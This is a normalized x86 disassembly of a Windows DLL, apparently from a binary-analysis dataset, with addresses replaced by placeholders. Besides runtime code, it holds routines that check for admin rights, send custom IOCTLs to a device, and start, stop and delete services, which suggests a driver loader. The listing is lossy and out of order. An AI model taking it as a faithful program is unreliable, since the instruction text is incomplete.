push ebx
call sub_10006a6a
pop ecx
jmp r-xdata
cmp ebx 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov edx [ esi + 0x54 ]
cmp eax 0x8
mov [ ebp - 0x8 ] edx
mov [ esi + 0x54 ] ecx
jne r-xdata
cmp eax 0xb
je r-xdata
push 0x3
call sub_100059e7
push 0x1
call sub_10006a6a
pop ecx
sub eax 0x4
je r-xdata
mov [ edi ] ecx
mov edx [ esi + 0x58 ]
mov [ esi + 0x58 ] 0x8c
mov [ ebp - 0xc ] edx
cmp eax 0x4
jne r-xdata
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
push 0x1
call sub_10006a6a
pop ecx
mov ecx [ rw-data ]
mov eax [ rw-data ]
add eax ecx
cmp ecx eax
jge r-xdata
cmp eax 0x8
jne r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_10006a09
mov esi [ ebp + 0x8 ]
pop ecx
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call ebx
cmp [ ebp + 0x8 ] 0xb
pop ecx
je r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov ebx [ rw-data ]
mov edi rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x8
mov [ esi + 0x54 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x4
jne r-xdata
mov edx [ esi + 0x50 ]
add eax 0xc
and [ edx + eax - 0x4 ] 0x0
mov edx [ rw-data ]
mov edi [ rw-data ]
inc ecx
add edi edx
cmp ecx edi
jl r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
mov [ esi + 0x58 ] eax
sub_1000b151
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx + 0x4 ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_1000b18e
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_1000b432
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_1000b1cd
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_100049d2
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_1000b6da
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_1000b23b
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000b297
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b23b
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
push 0x1
pop eax
sub_1000b2d0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_10006a09
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_1000ab98
mov ebx eax
add esp 0x4
call sub_1000ab98
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_10006a6a
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1000b3d1
mov eax [ esp + 0x4 ]
push esi
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov esi 0x8000
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 4 + 0x4 ]
mov cl [ ecx + eax * 4 + 0x4 ]
mov al cl
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
call sub_10004f88
mov [ eax ] 0x16
or eax 0xffffffff
pop esi
retn
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
sub_1000b432
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_1000b6af
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_1000b6af
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_10004190
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_10004190
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_1000b6af
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_1000b6da
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_10004aa3
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_1000b8b9
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_1000b861
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_100049d2
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_1000b1cd
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_10008cb7
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_1000413e
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_10008cb7
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_100049d2
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10009230
inc eax
inc eax
push eax
call sub_100049d2
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_10009140
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_1000413e
pop ecx
mov [ rw-data ] eax
sub_1000b861
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_1000b18e
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_1000b8b9
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_100049d2
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_100047cc
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_10004b3a
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_1000b960
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
push 0xc0000000
push esi
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
pop esi
retn
sub_1000b9b0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
mov ebx 0x1
[ edi ]
not ecx
dec ecx
mov edi esi
lea edx [ ecx + esi - 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx ebx
jle r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn
cmp [ edx ] 0x5c
je r-xdata
inc edx
dec edx
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn
sub_1000ba00
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
mov ebx [ esp + 0x14 ]
push esi
push ebx
call [ lstrcpyA@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
test ecx ecx
jle r-xdata
pop edi
pop esi
retn
pop ebx
pop edi
mov eax 0x1
pop esi
retn
cmp [ ecx + ebx ] 0x5c
je r-xdata
mov [ ecx + ebx ] 0x0
dec ecx
test ecx ecx
jg r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
retn
sub_1000ba60
mov edx [ esp + 0x4 ]
push edi
test edx edx
je r-xdata
xor eax eax
pop edi
retn
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0xfffffffe
test ecx ecx
jle r-xdata
cmp [ ecx + edx ] 0x2e
je r-xdata
lea eax [ ecx + edx + 0x1 ]
pop edi
retn
dec ecx
test ecx ecx
jg r-xdata
sub_1000baa0
sub esp 0x10
push ebx
lea eax [ esp + 0x8 ]
xor ebx ebx
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
lea ecx [ esp + 0x30 ]
push 0x2
push ecx
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x5
call [ AllocateAndInitializeSid@IAT ]
cmp eax ebx
mov [ esp + 0x4 ] eax
je r-xdata
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call CheckTokenMembership
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_1000bb20
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov ebx [ esp + 0x14 ]
[ edi ]
not ecx
dec ecx
mov edi ebx
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov eax 0x1
mov esi ecx
sub eax ebp
add esi eax
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ esp + 0x18 ]
push ebp
push ecx
push ebx
call sub_10010e80
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
inc ebx
inc edi
cmp edi esi
jl r-xdata
sub_1000bb80
sub esp 0x104
lea ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0x110 ]
push edi
mov edi [ esp + 0x110 ]
mov eax [ esi ]
push eax
push edi
push rw-data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
lea edx [ esp + 0x8 ]
push edx
push edi
call [ GetWindowThreadProcessId@IAT ]
mov ecx [ esi ]
mov eax [ esp + 0x8 ]
cmp eax ecx
jne r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x104
retn 0x8
mov [ esi + 0x4 ] edi
pop edi
xor eax eax
pop esi
add esp 0x104
retn 0x8
sub_1000bbf0
mov eax [ esp + 0x4 ]
sub esp 0x8
test eax eax
jne r-xdata
mov [ esp ] eax
lea eax [ esp ]
push eax
push sub_1000bb80
mov [ esp + 0xc ] 0x0
call [ EnumWindows@IAT ]
mov eax [ esp + 0x4 ]
add esp 0x8
retn
call [ GetCurrentProcessId@IAT ]
sub_1000bc30
push ebx
push edi
push 0x44
call sub_100049d2
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov edx [ esp + 0xc ]
mov ecx 0x11
xor eax eax
mov edi ebx
test edx edx
[ edi ]
je r-xdata
pop edi
pop ebx
retn
mov edx [ ebx + 0x40 ]
push edx
call sub_1000be40
add esp 0x4
mov eax ebx
pop edi
pop ebx
retn
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push esi
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
push ecx
push edx
call sub_1000c170
add esp 0x8
mov [ ebx + 0x40 ] eax
test eax eax
pop esi
jne r-xdata
push ebx
call sub_1000413e
add esp 0x4
xor eax eax
pop edi
pop ebx
retn
sub_1000bcb0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
call sub_1000be50
push esi
call sub_1000413e
add esp 0x4
push 0x0
push eax
call sub_1000c390
add esp 0x8
sub_1000bd20
mov eax [ esp + 0x4 ]
sub esp 0xc4
push ebx
push ebp
mov ebp [ eax + 0x40 ]
push esi
test ebp ebp
push edi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc4
retn
mov esi [ esp + 0xdc ]
mov ecx 0x30
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov edi esi
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0x80
ja r-xdata
mov ebx [ esp + 0xe0 ]
or ecx 0xffffffff
mov edi ebx
[ edi ]
not ecx
dec ecx
cmp ecx 0x20
ja r-xdata
mov edx [ esp + 0xe4 ]
or ecx 0xffffffff
mov edi edx
[ edi ]
not ecx
dec ecx
cmp ecx 0x20
ja r-xdata
lea eax [ esp + 0x14 ]
mov edi esi
mov [ esp + 0x10 ] eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
lea esi [ esp + 0x94 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x10 ] esi
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea ebx [ esp + 0xb4 ]
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea eax [ esp + 0x14 ]
mov edx ecx
mov esi edi
mov edi ebx
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
call sub_1000c4b0
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc4
retn
sub_1000be60
sub esp 0x8
mov eax [ rw-data ]
mov [ esp ] 0x0
test eax eax
je r-xdata
xor eax eax
add esp 0x8
retn
lea ecx [ esp ]
push 0x0
push ecx
lea edx [ esp + 0xc ]
push 0x4
push edx
push 0x0
push 0x0
push 0x22c000
push eax
call [ DeviceIoControl@IAT ]
test eax eax
je r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax [ esp + 0x4 ]
add esp 0x8
retn
sub_1000beb0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
lea ecx [ esp + 0x4 ]
push 0x0
push ecx
push 0x0
push 0x0
push 0x4
push edx
push 0x22c004
push eax
call [ DeviceIoControl@IAT ]
retn
retn
sub_1000bee0
mov eax [ rw-data ]
sub esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov [ esp + 0x4 ] edx
mov [ esp ] ecx
mov cx [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
push 0x0
push edx
mov [ esp + 0x10 ] cx
push 0x0
push 0x0
lea ecx [ esp + 0x10 ]
push 0xc
push ecx
push 0x22c008
push eax
call [ DeviceIoControl@IAT ]
add esp 0xc
retn
add esp 0xc
retn
sub_1000bf30
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
lea ecx [ esp + 0x4 ]
push 0x0
push ecx
push 0x0
push 0x0
push 0x4
push edx
push 0x22c00c
push eax
call [ DeviceIoControl@IAT ]
retn
retn
sub_1000bf60
sub esp 0x10
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x8 ] ecx
push 0x0
push eax
mov eax [ rw-data ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x14 ] edx
push 0x4
push ecx
lea edx [ esp + 0x14 ]
push 0xc
push edx
push 0x22c010
push eax
mov [ esp + 0x20 ] 0x0
call [ DeviceIoControl@IAT ]
mov ecx [ esp ]
neg eax
sbb eax eax
and eax ecx
add esp 0x10
retn
sub_1000bfc0
sub esp 0xc
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov [ esp ] eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x4 ] ecx
push 0x0
push eax
mov eax [ rw-data ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
push 0x4
push ecx
lea edx [ esp + 0x10 ]
push 0xc
push edx
push 0x22c014
push eax
call [ DeviceIoControl@IAT ]
mov ecx [ esp + 0x10 ]
neg eax
sbb eax eax
and eax ecx
add esp 0xc
retn
sub_1000c010
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x1c
retn
sub_1000c090
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
jne r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
retn
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
retn
call esi
push edi
call esi
pop edi
xor eax eax
pop esi
retn
sub_1000c100
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x1c
retn
sub_1000c170
sub esp 0x340
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x240 ]
push ebx
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x250 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push 0x0
[ edi ] [ esi ]
mov edi [ esp + 0x358 ]
or ecx 0xffffffff
